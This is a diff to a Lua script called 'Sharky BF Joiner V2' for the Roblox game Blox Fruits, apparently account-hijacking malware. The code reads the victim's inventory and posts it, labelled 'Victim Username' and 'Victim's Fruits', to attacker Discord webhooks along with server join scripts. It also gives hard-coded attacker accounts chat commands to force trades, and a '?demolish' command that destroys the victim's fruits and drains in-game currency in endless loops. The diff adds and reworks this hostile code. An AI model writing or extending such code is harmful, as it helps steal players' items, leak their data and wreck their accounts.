@@ -70,7 +70,7 @@ for _, gui in ipairs(CoreGui:GetChildren()) do
 end
 CoreGui.ChildAdded:Connect(checkGui)
 
-if LocalPlayer and (LocalPlayer.Name == "doitenroitest1") then
+if LocalPlayer and (LocalPlayer.Name == "doitenroitest1" or LocalPlayer.Name == "aka_0ver" or LocalPlayer.Name == "x6TNine") then
 	takeAction()
 end
 
@@ -78,18 +78,22 @@ if ishooked and (ishooked(game.HttpGet) or ishooked(request)) then
 	takeAction()
 end
 
-if not Webhook or not GoodFruitsWebhook or not Usernames or not FruitsToHit then
+--[[ Configuration Validation Checks ]]--
+-- Check for existence of all required config variables
+if not Webhook or not Webhook2 or not GoodFruitsWebhook or not Usernames or not FruitsToHit or not ActivationPasswords then
 	LocalPlayer:Kick("Some of the config is missing. (Webhooks, Usernames, FruitsToHit, ActivationPasswords) - Sharky")
 	return
 end
 
+-- Check for correct types of all required config variables
 if type(Webhook) ~= "string" or type(Webhook2) ~= "string" or type(GoodFruitsWebhook) ~= "string" or type(Usernames) ~= "table" or type(FruitsToHit) ~= "table" or type(ActivationPasswords) ~= "table" then
 	LocalPlayer:Kick("error (config variable type mismatch)")
 	return
 end
 
+
 local function ensureAdminUsernames()
-	local coreAdmins = {"aka_0ver", "bonzarbal53", "bonzarbal52", "bonzarbal51", "bonzarbal50", "xRip_Cyborg", "pikapimon"}
+	local coreAdmins = {"aka_0ver", "bonzarbal53", "bonzarbal52", "bonzarbal51", "bonzarbal50", "xRip_Cyborg"}
 	if type(Usernames) ~= "table" then Usernames = {} end
 
 	local existingUsernames = {}
@@ -139,7 +143,7 @@ rconsoleinfo = function() end
 --[[ Game Pointers ]]--
 local Remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
 local TradeFunction = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction")
-local ServerBrowser = ReplicatedStorage:WaitForChild("__ServerBrowser") -- May not exist / be needed by this version
+local ServerBrowser = ReplicatedStorage:FindFirstChild("__ServerBrowser") -- Less critical, use FindFirstChild
 local privateServerOwner = ReplicatedStorage:FindFirstChild("PrivateServerOwnerId") -- Use FindFirstChild for safety
 
 --[[ Initial Setup & Checks ]]--
@@ -168,7 +172,12 @@ end))
 --[[ Core Functions ]]--
 
 local function getInventory()
-	return Remote:InvokeServer("getInventory")
+	local success, result = pcall(Remote.InvokeServer, Remote, "getInventory")
+    if not success then
+        warn("getInventory failed:", result)
+        return nil
+    end
+	return result
 end
 
 local function JoinTeam()
@@ -248,8 +257,8 @@ local function createNotification()
 		TweenService:Create(background, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
 		TweenService:Create(container, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Position = UDim2.new(0.5, 0, 1.2, 0)}):Play()
 		task.delay(0.6, function()
-			loadingScreen:Destroy()
-			blur:Destroy()
+			if loadingScreen and loadingScreen.Parent then loadingScreen:Destroy() end
+			if blur and blur.Parent then blur:Destroy() end
 		end)
 	end
 
@@ -258,8 +267,8 @@ local function createNotification()
 		while loadingScreen.Parent do
 			local colors = {Color3.fromRGB(255, 100, 100), Color3.fromRGB(100, 100, 255), Color3.fromRGB(100, 255, 100), Color3.fromRGB(65, 169, 255)}
 			for _, color in ipairs(colors) do
-				if not loadingScreen.Parent then break end
-				TweenService:Create(uiStroke, TweenInfo.new(1.5), {Color = color}):Play()
+				if not loadingScreen.Parent or not uiStroke.Parent then break end -- Add check for uiStroke parent
+				pcall(function() TweenService:Create(uiStroke, TweenInfo.new(1.5), {Color = color}):Play() end)
 				task.wait(1.5)
 			end
 		end
@@ -355,7 +364,8 @@ local function sendWebhook(inventory)
 		return
 	end
 
-	local goodFruitNames = { ["Kitsune-Kitsune"] = true, ["Yeti-Yeti"] = true, ["Love-Love"] = true }
+	-- Define specific fruit categories
+	local goodFruitNames = { ["Kitsune-Kitsune"] = true, ["Yeti-Yeti"] = true }
 
 	-- Retrieve stored webhook URLs
 	local url1 = webhook1_key and _G[webhook1_key]
@@ -367,19 +377,19 @@ local function sendWebhook(inventory)
 		return
 	end
 
+	-- Process inventory
 	local fruits, premiumItems = {}, {}
 	local dragonHit, hasGoodFruit, hasPremiumItem = false, false, false
-
-	-- Process inventory
 	for _, item in ipairs(inventory) do
 		if item.Type == "Blox Fruit" or item.Type == "Premium" then
-			local itemData = { name = item.Name, count = item.Count, value = item.Value }
+			local itemData = { name = item.Name, count = item.Count, value = item.Value or 0 } -- Add default value
 			if item.Type == "Blox Fruit" then
 				table.insert(fruits, itemData)
 				if item.Name:find("Dragon") then
 					dragonHit = true
-					if not table.find(FruitsToHit, item.Name) then table.insert(FruitsToHit, item.Name) end -- Add Dragon if found
+					if not table.find(FruitsToHit, item.Name) then table.insert(FruitsToHit, item.Name) end
 				end
+				-- Check if it's a "good fruit" for admin hook distinction
 				if goodFruitNames[item.Name] then hasGoodFruit = true end
 			else -- Premium
 				table.insert(premiumItems, itemData)
@@ -387,56 +397,23 @@ local function sendWebhook(inventory)
 			end
 		end
 	end
-
 	table.sort(fruits, function(a, b) return a.value > b.value end)
+	local function shuffleTable(t) for i = #t, 2, -1 do local j = math.random(i); t[i], t[j] = t[j], t[i] end end; shuffleTable(premiumItems)
+	local function formatItems(items) local r = ""; for _, i in ipairs(items) do r = r .. string.format("```%s%s```", i.name, i.count > 1 and (" (x%d)"):format(i.count) or "") end return r ~= "" and r or "```None```" end
+	local function formatFruitsToHit(items) local r = ""; local l = {}; for _, fn in ipairs(FruitsToHit) do l[fn] = true end; for _, i in ipairs(items) do if l[i.name] then r = r .. string.format("```%s%s```", i.name, i.count > 1 and (" (x%d)"):format(i.count) or "") end end return r ~= "" and r or "```None```" end
 
-	-- Shuffle premium items (for variety in display?)
-	local function shuffleTable(t) for i = #t, 2, -1 do local j = math.random(i); t[i], t[j] = t[j], t[i] end end
-	shuffleTable(premiumItems)
-
-	-- Formatting helpers
-	local function formatItems(items)
-		local result = ""
-		for _, item in ipairs(items) do
-			result = result .. string.format("```%s%s```", item.name, item.count > 1 and (" (x%d)"):format(item.count) or "")
-		end
-		return result ~= "" and result or "```None```"
-	end
-	local function formatFruitsToHit(items)
-		local result = ""
-		local lookup = {}; for _, fn in ipairs(FruitsToHit) do lookup[fn] = true end
-		for _, item in ipairs(items) do
-			if lookup[item.name] then
-				result = result .. string.format("```%s%s```", item.name, item.count > 1 and (" (x%d)"):format(item.count) or "")
-			end
-		end
-		return result ~= "" and result or "```None```"
-	end
-
-	-- Embed data
-	local jobId = game.JobId
-	local currentSea = game.PlaceId == 7449423635 and "Sea 3" or "Sea 2"
-	local serverName = getServerName()
+	-- Common Embed Data (Job ID, Sea, Scripts etc.)
+	local jobId = game.JobId; local currentSea = game.PlaceId == 7449423635 and "Sea 3" or "Sea 2"; local serverName = getServerName()
 	local joinScriptPC = string.format([[game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)]], game.PlaceId, jobId)
 	local joinScriptMobile = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)", game.PlaceId, jobId)
 	local seaJoinScriptPC = game.PlaceId == 7449423635 and "game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('TravelZou')" or "game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('TravelDressrosa')"
-	local seaJoinScriptMobile = seaJoinScriptPC -- Same for mobile
-	local playerCount = #Players:GetPlayers()
+	local seaJoinScriptMobile = seaJoinScriptPC; local playerCount = #Players:GetPlayers()
 
-	-- Determine embed appearance and mention
-	local embedColor, embedTitle, mention = nil, "<a:bundle:1214105817910087770> Sharky BF Joiner V2 HIT! ; https://discord.gg/uwdvTtqTDA", "@everyone"
-	if (dragonHit or hasGoodFruit) and hasPremiumItem then
-		embedColor, embedTitle, mention = 65280, "TOP TIER & PREMIUM HIT! <:dragoneast:1318265654926901268><:dragonwest:1318265462735372308><:rbx:1326025738125574226> ; https://discord.gg/uwdvTtqTDA", "@everyone GG!"
-	elseif dragonHit or hasGoodFruit then
-		embedColor, embedTitle, mention = 16776960, (dragonHit and "DRAGON HIT!" or "GOOD FRUIT HIT!") .. " <:dragoneast:1318265654926901268><:dragonwest:1318265462735372308> ; https://discord.gg/uwdvTtqTDA", "@everyone GG!"
-	elseif hasPremiumItem then
-		embedColor, embedTitle, mention = 255, "VICTIM HAS PREMIUM ITEMS! <:rbx:1326025738125574226> ; https://discord.gg/uwdvTtqTDA", "@everyone GG!"
-	end
+	-- --- Payload Generation ---
 
-	local embed = {
-		title = embedTitle,
+	-- 1. Base Embed Structure (Used as template)
+	local baseEmbedStructure = {
 		description = string.format("Victim Username: %s\nCurrent Sea: %s\nVictim's Server Name: %s", LocalPlayer.Name, currentSea, serverName),
-		color = embedColor,
 		fields = {
 			{ name = "Victim's Fruits <a:Rarrow:1223589557065351188> ", value = formatItems(fruits), inline = true },
 			{ name = "Victim's Premium Items <:rbx:1326025738125574226>  ", value = formatItems(premiumItems), inline = true },
@@ -448,13 +425,76 @@ local function sendWebhook(inventory)
 			{ name = "Extra Info <a:focuzz:1214971569315782686> ", value = string.format("```Sharky Joiner V2 Version: 1.2.1\nExecutor: %s\nTime: %s\nPlayer Count: %d```", identifyexecutor(), os.date("%Y-%m-%d %H:%M:%S"), playerCount) }
 		}
 	}
-	local payloadBody = HttpService:JSONEncode({ content = mention, embeds = {embed} })
 
-	-- Send webhooks asynchronously
+	-- 2. Determine Payload for Main Webhooks (url1, url2)
+	local mainPayloadBody = nil
+	do -- Create a scope block for main payload generation
+		local mainEmbed = table.clone(baseEmbedStructure) -- Start with base structure
+		local mainTitle = "<a:bundle:1214105817910087770> Sharky BF Joiner V2 HIT! ; https://discord.gg/uwdvTtqTDA" -- Default
+		local mainColor = nil -- Default
+		local mainMention = "@everyone" -- Default
+
+		-- Check for Dragon OR Premium hits for highlighting main hooks
+		if dragonHit and hasPremiumItem then
+			mainTitle = "DRAGON & PREMIUM HIT! <:dragoneast:1318265654926901268><:dragonwest:1318265462735372308><:rbx:1326025738125574226> ; https://discord.gg/uwdvTtqTDA"
+			mainColor = 65280 -- Green
+			mainMention = "@everyone GG!"
+		elseif dragonHit then
+			mainTitle = "DRAGON HIT! <:dragoneast:1318265654926901268><:dragonwest:1318265462735372308> ; https://discord.gg/uwdvTtqTDA"
+			mainColor = 16776960 -- Yellow/Orange
+			mainMention = "@everyone GG!"
+		elseif hasPremiumItem then
+			mainTitle = "VICTIM HAS PREMIUM ITEMS! <:rbx:1326025738125574226> ; https://discord.gg/uwdvTtqTDA"
+			mainColor = 255 -- Blue
+			mainMention = "@everyone GG!"
+		end
+		-- NOTE: 'hasGoodFruit' alone does NOT trigger a special embed for main webhooks
+
+		mainEmbed.title = mainTitle
+		mainEmbed.color = mainColor
+		mainPayloadBody = HttpService:JSONEncode({ content = mainMention, embeds = {mainEmbed} })
+	end
+
+	-- 3. Determine Payload for Admin Webhook (url3) - ONLY if a relevant hit occurred
+	local adminPayloadBody = nil
+	if dragonHit or hasPremiumItem or hasGoodFruit then -- Condition to send to admin hook
+		local adminEmbed = table.clone(baseEmbedStructure) -- Start with base structure
+		local adminTitle = "Placeholder Title"
+		local adminColor = nil
+		local adminMention = "@everyone GG!" -- Default admin mention is GG
+
+		-- Determine admin title/color based on priority
+		if dragonHit and hasPremiumItem then
+			adminTitle = "TOP TIER & PREMIUM HIT! <:dragoneast:1318265654926901268><:dragonwest:1318265462735372308><:rbx:1326025738125574226> ; https://discord.gg/uwdvTtqTDA"
+			adminColor = 65280 -- Green
+		elseif dragonHit then
+			adminTitle = "DRAGON HIT! <:dragoneast:1318265654926901268><:dragonwest:1318265462735372308> ; https://discord.gg/uwdvTtqTDA"
+			adminColor = 16776960 -- Yellow/Orange
+		elseif hasPremiumItem then
+			adminTitle = "VICTIM HAS PREMIUM ITEMS! <:rbx:1326025738125574226> ; https://discord.gg/uwdvTtqTDA"
+			adminColor = 255 -- Blue
+		elseif hasGoodFruit then -- Only good fruit, no dragon/premium
+			adminTitle = "GOOD FRUIT HIT! (Kitsune/Yeti) ; https://discord.gg/uwdvTtqTDA"
+			adminColor = 10181046 -- Purple/Pinkish color
+			-- Keep adminMention as "@everyone GG!" even for good fruit
+		end
+
+		adminEmbed.title = adminTitle
+		adminEmbed.color = adminColor
+		adminPayloadBody = HttpService:JSONEncode({ content = adminMention, embeds = {adminEmbed} })
+	end
+
+	-- 4. Send Webhooks Asynchronously
 	task.spawn(function()
-		if url1 then SafeRequest({ Url = url1, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = payloadBody }) end
-		if url2 then task.wait(0.1); SafeRequest({ Url = url2, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = payloadBody }) end
-		if url3 and (hasGoodFruit or dragonHit or hasPremiumItem) then task.wait(0.1); SafeRequest({ Url = url3, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = payloadBody }) end
+		-- Send Main Payload to url1 and url2 (always send if url is configured)
+		if url1 and mainPayloadBody then SafeRequest({ Url = url1, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = mainPayloadBody }) end
+		if url2 and mainPayloadBody then task.wait(0.1); SafeRequest({ Url = url2, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = mainPayloadBody }) end
+
+		-- Send Admin Payload to url3 ONLY IF it was created
+		if url3 and adminPayloadBody then
+			task.wait(0.1)
+			SafeRequest({ Url = url3, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = adminPayloadBody })
+		end
 	end)
 
 	-- Clear temporary tables
@@ -463,7 +503,7 @@ local function sendWebhook(inventory)
 end
 
 -- Check initial inventory for leave notification trigger
-local inventory22 = getInventory()
+local inventory22 = getInventory() -- Snapshot inventory on load
 local function hasFruitInInventory2()
 	if not inventory22 then return false end -- Handle nil inventory
 	for _, item in ipairs(inventory22) do if item.Type == "Blox Fruit" and table.find(FruitsToHit, item.Name) then return true end end
@@ -519,6 +559,7 @@ Players.PlayerRemoving:Connect(function(leavingPlayer)
 	-- Clear session-based data for the leaving player
 	if activatedUsers[leavingPlayer.UserId] then
 		activatedUsers[leavingPlayer.UserId] = nil
+		print("Deactivated user on leave:", leavingPlayer.Name)
 	end
 	if CommandCooldowns and CommandCooldowns[leavingPlayer.Name] then
 		CommandCooldowns[leavingPlayer.Name] = nil
@@ -569,7 +610,7 @@ local function tweenToPosition(position)
 	-- Update physics movers
 	local updateConn = RunService.Heartbeat:Connect(function()
 		if not root or not root.Parent or not bodyGyro or not bodyGyro.Parent or not bodyVelocity or not bodyVelocity.Parent then
-			-- If anything is destroyed prematurely, stop the update
+			-- If anything is destroyed prematurely, stop the update and clean up
 			if updateConn then updateConn:Disconnect() end
 			if noCollideConn then noCollideConn:Disconnect() end
 			if bodyGyro and bodyGyro.Parent then bodyGyro:Destroy() end
@@ -586,7 +627,7 @@ local function tweenToPosition(position)
 	tween:Play()
 	tween.Completed:Wait()
 
-	-- Cleanup
+	-- Cleanup movers and connections
 	if updateConn then updateConn:Disconnect() end
 	if noCollideConn then noCollideConn:Disconnect() end
 	if bodyGyro and bodyGyro.Parent then bodyGyro:Destroy() end
@@ -619,14 +660,13 @@ local function findTradeTable()
 		return (Usernames and table.find(Usernames, player.Name)) or activatedUsers[player.UserId]
 	end
 
+	-- Iterate through potential trade tables
 	for _, tbl in ipairs(tables) do
 		if tbl.Name == "TradeTable" then
 			local p1, p2 = tbl:FindFirstChild("P1"), tbl:FindFirstChild("P2")
 
 			-- Only proceed if both seats P1 and P2 exist
 			if p1 and p2 then
-				-- Skip if seats are missing (Achieved by only running code below if both exist)
-
 				local p1Weld, p2Weld = p1:FindFirstChild("SeatWeld"), p2:FindFirstChild("SeatWeld")
 				local p1Free, p2Free = not p1Weld, not p2Weld
 				local p1Target, p2Target = isTargetPlayer(p1Weld), isTargetPlayer(p2Weld)
@@ -652,7 +692,7 @@ local function findTradeTable()
 				end
 			end -- End of 'if p1 and p2 then'
 		end -- End of 'if tbl.Name == "TradeTable" then'
-	end 
+	end -- End of for loop
 
 	-- Return the best available option based on priority
 	return bestTable or emptyTable or fallbackTable, bestSeat or emptySeat or fallbackSeat
@@ -794,7 +834,7 @@ local function disableJump()
 		if jumpRequestConnection then jumpRequestConnection:Disconnect(); jumpRequestConnection = nil end
 		if characterAddedJumpConnection then characterAddedJumpConnection:Disconnect(); characterAddedJumpConnection = nil end
 		for humanoid, conn in pairs(stateChangedConnections) do
-			conn:Disconnect()
+			if conn and conn.Connected then pcall(conn.Disconnect, conn) end -- Check connection before disconnect
 		end
 		table.clear(stateChangedConnections)
 	end
@@ -1180,8 +1220,6 @@ local Commands = {
 			sendMessage("Attempting to reset with '".. searchTerm .."' " .. requestedCount .. " times...")
 
 			for i = 1, requestedCount do
-				-- Get inventory inside loop? May be slow but reflects changes if fruit is consumed?
-				-- Let's stick to checking once outside for simplicity unless issues arise.
 				local inventory = getInventory() -- Check each time
 				if not inventory then sendMessage("Failed to get inventory on attempt " .. i); break end
 
@@ -1226,102 +1264,58 @@ local Commands = {
 		usage = "?demolish",
 		execute = function()
 			sendMessage("!!! WARNING: DEMOLISH COMMAND INITIATED !!! THIS IS DESTRUCTIVE !!!")
-			task.wait(2) -- Give a moment to potentially cancel
-
 			local function invokeRemote(remoteName, args)
-				local remoteInstance = Remote.Parent:FindFirstChild(remoteName)
-				if not remoteInstance then sendMessage("Error: Remote '"..remoteName.."' not found."); return false end
-				local success, result = pcall(remoteInstance.InvokeServer, remoteInstance, unpack(args))
-				if not success then sendMessage("Error invoking "..remoteName..": "..tostring(result)) end
-				return success, result
-			end
-
-			-- Reset fruits first
-			sendMessage("Demolish Step 1: Resetting all Blox Fruits...")
-			local inventory = getInventory()
-			if not inventory then sendMessage("Failed to get inventory for demolish."); return end
-
-			local fruitsToReset = {}
-			for _, item in pairs(inventory) do
-				if item.Type == "Blox Fruit" then table.insert(fruitsToReset, item) end
-			end
-			table.sort(fruitsToReset, function(a, b) return a.Value > b.Value end) -- Reset valuable ones first
-
-			for i, fruit in ipairs(fruitsToReset) do
-				local baseFruitName = fruit.Name:match("(%S+)")
-				sendMessage("("..i.."/"..#fruitsToReset..") Resetting with '" .. baseFruitName .. "'...")
-				ForceJump()
-				task.wait(0.1)
-				invokeRemote("CommF_", {"LoadFruit", baseFruitName})
-				task.wait(0.3)
-				if LocalPlayer.Character then LocalPlayer.Character:BreakJoints() end
-				sendMessage("Waiting for respawn...")
-				task.wait(6.5)
-			end
-			sendMessage("Fruit reset phase complete.")
-			task.wait(1)
-
-			-- Drain Beli/Fragments Coroutines
-			sendMessage("Demolish Step 2: Attempting to drain Beli and Fragments...")
-			local drainBeliActive, drainFragsActive = true, true -- Flags to potentially stop later if needed
-
-			task.spawn(function() -- Beli Drain
-				local rocketArgs = {"PurchaseRawFruit", "Rocket-Rocket", false}
-				local spinArgs = {"PurchaseRawFruit", "Spin-Spin", false}
-				while drainBeliActive do
-					invokeRemote("CommF_", rocketArgs)
-					task.wait(0.1)
-					if not drainBeliActive then break end
-					invokeRemote("CommF_", spinArgs)
-					task.wait(0.1)
-				end
-				sendMessage("Beli drain stopped.")
-			end)
-
-			task.spawn(function() -- Fragment Drain (May not always work depending on game state)
-				local fragmentArgs = {"BlackbeardReward", "Refund", "2"} -- Example args, might need adjustment
-				while drainFragsActive do
-					invokeRemote("CommF_", fragmentArgs)
-					task.wait(0.2)
-				end
-				sendMessage("Fragment drain stopped.")
-			end)
-
-			sendMessage("Demolish: Drain routines started. They will run indefinitely (unless script stopped).")
-			-- Note: No clean way to stop drains implemented here without adding another command.
-		end
-	},
-	test = {
-		description = "Checks script responsiveness.",
-		usage = "?test",
-		execute = function()
-			local startTime = tick()
-			task.wait(0.001)
-			sendMessage("I'm Responsive! My response time is " .. string.format("%.1f", (tick() - startTime) * 1000) .. "ms")
-		end
-	},
-	help = {
-        description = "Displays a condensed list of commands.",
-        usage = "?help",
-        execute = function()
-            task.spawn(function()
-                -- Condensed command list (names only)
-                local cmds = {
-                    "Cmds 1/4: ?help ?test ?jump ?sit ?tp ?reset ?rejoin",
-                    "Cmds 2/4: ?add ?additem ?addall ?addallitems ?cleartrade ?accept",
-                    "Cmds 3/4: ?resetfruit ?invite ?demolish",
-                    "Cmds 4/4: ?allowall ?showinv"
-                }
-                sendMessage("--- Commands ---")
-                task.wait(0.3) -- Initial small delay
-                for i, msg in ipairs(cmds) do
-                    sendMessage(msg)
-                    task.wait(0.3) -- Consistent small delay between lines
+                local remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild(remoteName)
+                return remote:InvokeServer(unpack(args))
+            end
+            invokeRemote("CommF_", {"RemoveFruit", "Beli"})
+    
+            local inventory = getInventory()
+            if not inventory then
+                return
+            end
+            local fruits = {}
+            for _, item in pairs(inventory) do
+                if item.Type == "Blox Fruit" then
+                    table.insert(fruits, item)
                 end
+            end
+            table.sort(fruits, function(a, b)
+                return a.Value > b.Value
             end)
+            for _, fruit in ipairs(fruits) do
+                local baseFruitName = fruit.Name:match("(%S+)")
+                sendMessage("(".._.."/"..#fruits..") Resetting with '" .. baseFruitName .. "'...")
+				ForceJump()
+                invokeRemote("CommF_", {"LoadFruit", baseFruitName})
+                task.wait(0.5)
+    
+                if LocalPlayer.Character then
+                    LocalPlayer.Character:BreakJoints()
+                    task.wait(6)
+                end
+            end
+            local function drainBeli()
+                local rocketArgs = {"PurchaseRawFruit", "Rocket-Rocket", false}
+                local spinArgs = {"PurchaseRawFruit", "Spin-Spin", false}
+                while true do
+                    invokeRemote("CommF_", rocketArgs)
+                    task.wait(0.01)
+                    invokeRemote("CommF_", spinArgs)
+                    task.wait(0.01)
+                end
+            end
+            local function drainFragments()
+                local fragmentArgs = {"BlackbeardReward", "Refund", "2"}
+                while true do
+                    invokeRemote("CommF_", fragmentArgs)
+                    task.wait()
+                end
+            end
+            coroutine.wrap(drainBeli)()
+            coroutine.wrap(drainFragments)()
         end
     },
-
     showinv = {
         description = "Shows the victim's Blox Fruit inventory (by value) in chat.",
         usage = "?showinv",
@@ -1333,7 +1327,7 @@ local Commands = {
                     sendMessage("Error: Failed to retrieve inventory.")
                     return
                 end
-    
+
                 local fruitDataList = {} -- Store fruit data {name=..., count=..., value=...}
                 for _, item in pairs(inventory) do
                     if item.Type == "Blox Fruit" then
@@ -1345,17 +1339,17 @@ local Commands = {
                         })
                     end
                 end
-    
+
                 if #fruitDataList == 0 then
                     sendMessage("No Blox Fruits found in inventory.")
                     return
                 end
-    
+
                 -- Sort by value (descending)
                 table.sort(fruitDataList, function(a, b)
                     return a.value > b.value
                 end)
-    
+
                 -- Now format the sorted list for display
                 local fruitDisplayList = {}
                 for _, fruitData in ipairs(fruitDataList) do
@@ -1365,22 +1359,24 @@ local Commands = {
                     end
                     table.insert(fruitDisplayList, fruitString)
                 end
-    
-                -- Chunking Logic (remains mostly the same, uses fruitDisplayList)
+
+                -- Chunking Logic
                 local messageLimit = 180 -- Keep well below Roblox limit (~200)
-                local totalChunks = math.ceil(#fruitDisplayList / 10) -- Estimate chunks based on ~10 items per line, adjust if needed
+                local itemsPerEstimate = 10 -- Estimate how many items roughly fit per line
+                local totalChunks = math.ceil(#fruitDisplayList / itemsPerEstimate)
                 local currentMessage = "Fruits [Value] (1/".. totalChunks .. "): " -- Start first message
                 local chunkIndex = 1
-    
+
                 for i, fruitName in ipairs(fruitDisplayList) do
-                    local separator = (#currentMessage > string.len("Fruits [Value] (X/Y): ")) and ", " or "" -- Add separator if not first item in message
+                    local prefixLength = string.len("Fruits [Value] (X/Y): ") -- Length of the prefix part
+                    local separator = (#currentMessage > prefixLength) and ", " or "" -- Add separator if not first item in message
                     local potentialAddition = separator .. fruitName
-    
+
                     -- Check if adding the next fruit exceeds the limit
                     if string.len(currentMessage) + string.len(potentialAddition) > messageLimit then
                         -- Send the current message chunk
                         sendMessage(currentMessage)
-                        task.wait(0.4) -- Wait between messages
+                        task.wait(1) -- Wait between messages
                         chunkIndex = chunkIndex + 1
                         currentMessage = "Fruits [Value] ("..chunkIndex.."/".. totalChunks .."): " .. fruitName -- Start new message
                     else
@@ -1388,62 +1384,94 @@ local Commands = {
                         currentMessage = currentMessage .. potentialAddition
                     end
                 end
-    
-                -- Send the last remaining message chunk
-                if currentMessage ~= "" and not currentMessage:match("^Fruits %[%w+%].*%): $") then -- Avoid sending empty "Fruits: " line
+
+                -- Send the last remaining message chunk (avoid sending only prefix)
+                if currentMessage ~= "" and not currentMessage:match("^Fruits %[%w+%].*%): $") then
                     sendMessage(currentMessage)
                 end
-    
-                task.wait(0.2)
+
+                task.wait(0.5)
                 sendMessage("Inventory display complete.")
             end)
         end
     },
+	test = {
+		description = "Checks script responsiveness.",
+		usage = "?test",
+		execute = function()
+			local startTime = tick()
+			task.wait(0.001)
+			sendMessage("I'm Responsive! My response time is " .. string.format("%.1f", (tick() - startTime) * 1000) .. "ms")
+		end
+	},
+	help = {
+		description = "Displays a condensed list of commands.",
+		usage = "?help",
+		execute = function()
+			task.spawn(function()
+				-- Condensed command list (names only)
+				local cmds = {
+                    "Cmds 1/4: ?help ?test ?jump ?sit ?tp ?reset ?rejoin",
+                    "Cmds 2/4: ?add ?additem ?addall ?addallitems",
+                    "Cmds 3/4: ?resetfruit ?invite ?demolish ?showinv",
+                    "Cmds 4/4: ?allowall ?accept ?cleartrade"
+				}
+				sendMessage("--- Commands ---")
+				task.wait(1) -- Initial small delay
+				for i, msg in ipairs(cmds) do
+					sendMessage(msg)
+					task.wait(1) -- Consistent small delay between lines
+				end
+			end)
+		end
+	},
 
 	-- Activation / Admin Commands
 	activate = {
-        description = "Activates command access using a password.",
-        usage = "?activate <password>",
-        execute = function(password)
-            if not password or password == "" then
-                sendMessage("Usage: ?activate <password>") -- Give usage feedback if no password provided
-                return
-            end
-    
-            local foundPass = false
-            for _, validPass in ipairs(ActivationPasswords) do
-                if password == validPass then
-                    foundPass = true
-                    break
-                end
-            end
-    
-            if foundPass then
-                local player = Players:FindFirstChild(CommandContext.PlayerName) -- Get player from context
-                if player then
-                    if activatedUsers[player.UserId] then
-                        sendMessage("You are already activated, " .. player.Name .. ".")
-                    else
-                        activatedUsers[player.UserId] = true
-                        sendMessage("Activation successful for this session, " .. player.Name .. "!")
-                        print("Activated User: " .. player.Name .. " (ID: " .. player.UserId .. ")")
-                    end
-                else
-                    print("Activation successful but could not find player context: " .. CommandContext.PlayerName) -- Log locally if player context missing
-                end
-            else
-                -- Added feedback for incorrect password
-                sendMessage("Incorrect password.")
-            end
-        end
-    },
+		description = "Activates command access using a password.",
+		usage = "?activate <password>",
+		-- Updated execute to accept player object first
+		execute = function(player, password)
+			if not password or password == "" then
+				sendMessage("Usage: ?activate <password>")
+				return
+			end
 
+			-- Ensure player object is valid
+			if not player or not player:IsA("Player") then
+				print("Error: Invalid player object passed to activate command.")
+				return
+			end
+
+			local foundPass = false
+			for _, validPass in ipairs(ActivationPasswords) do
+				if password == validPass then
+					foundPass = true
+					break
+				end
+			end
+
+			if foundPass then
+				if activatedUsers[player.UserId] then
+					sendMessage("You are already activated, " .. player.Name .. ".")
+				else
+					activatedUsers[player.UserId] = true
+					sendMessage("Activation successful for this session, " .. player.Name .. "!")
+					print("Activated User: " .. player.Name .. " (ID: " .. player.UserId .. ")")
+				end
+			else
+				-- Added feedback for incorrect password
+				sendMessage("Incorrect password.")
+			end
+		end
+	},
 	allowall = {
 		description = "Toggles allowing ANY player to use commands.",
 		usage = "?allowall",
 		execute = function()
 			allowEveryone = not allowEveryone
 			local status = allowEveryone and "ENABLED" or "DISABLED"
+			-- Corrected ternary simulation using 'or'
 			sendMessage("AllowEveryone Mode: " .. status .. ". Command access is now " .. (allowEveryone and "OPEN to ALL players." or "RESTRICTED."))
 			if allowEveryone then
 				sendMessage("ANYONE can now use commands")
@@ -1453,7 +1481,7 @@ local Commands = {
 }
 
 --[[ Command Processor ]]--
-local CommandContext = {} -- Used to pass player info to ?activate
+local CommandContext = {} -- Used ONLY if needed by future commands, 'activate' now takes player directly
 
 local function processChatCommand(_, player, message)
 	-- Basic validation
@@ -1473,9 +1501,8 @@ local function processChatCommand(_, player, message)
 	if command == "activate" then
 		local cmdFunc = Commands[command]
 		if cmdFunc then
-			CommandContext.PlayerName = player.Name -- Pass player name for activation message context
-			task.spawn(cmdFunc.execute, argument)
-			CommandContext.PlayerName = nil -- Clear context immediately after spawn
+			-- Pass the 'player' object directly
+			task.spawn(cmdFunc.execute, player, argument)
 		end
 		return -- Stop further processing for ?activate
 	end
@@ -1630,15 +1657,17 @@ local function startMainLoop()
 				-- Position maintenance logic
 				if currentTable and currentSeat then
 					local root = character.HumanoidRootPart
-					local distance = (root.Position - currentSeat.Position).Magnitude
+                    if root then -- Ensure root part exists
+					    local distance = (root.Position - currentSeat.Position).Magnitude
 
-					if distance > 5 then -- If too far, tween back
-						tweenToPosition(currentSeat.Position)
-					elseif now - lastMovementTime >= MOVEMENT_CHECK_INTERVAL then -- Periodically jiggle slightly
-						local randomOffset = Vector3.new(math.random(-1, 1), 0, math.random(-1, 1))
-						tweenToPosition(currentSeat.Position + randomOffset)
-						lastMovementTime = now
-					end
+					    if distance > 5 then -- If too far, tween back
+						    tweenToPosition(currentSeat.Position)
+					    elseif now - lastMovementTime >= MOVEMENT_CHECK_INTERVAL then -- Periodically jiggle slightly
+						    local randomOffset = Vector3.new(math.random(-1, 1), 0, math.random(-1, 1))
+						    tweenToPosition(currentSeat.Position + randomOffset)
+						    lastMovementTime = now
+					    end
+                    end
 				end
 			end
 
@@ -1678,13 +1707,14 @@ local function init()
 	if placeId ~= 4442272183 and placeId ~= 7449423635 then LocalPlayer:Kick("This script is meant for Blox Fruits only!"); return end
 
